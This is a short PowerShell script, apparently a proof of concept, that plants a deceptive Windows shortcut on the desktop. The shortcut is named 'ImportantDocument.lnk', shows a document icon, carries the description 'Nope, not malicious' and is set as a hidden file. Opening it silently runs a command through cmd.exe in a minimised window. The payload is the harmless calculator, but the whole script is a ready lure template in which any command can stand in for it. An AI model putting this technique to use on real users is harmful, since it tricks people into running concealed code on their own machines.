$path                      = "$([Environment]::GetFolderPath('Desktop'))\ImportantDocument.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"

$shortcut.TargetPath       = "cmd.exe"
$shortcut.Arguments        = "/c calc.exe"
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "CTRL+M"
$shortcut.Description      = "Nope, not malicious"
$shortcut.WindowStyle      = 7
$shortcut.Save()

(Get-Item $path).Attributes += 'Hidden'
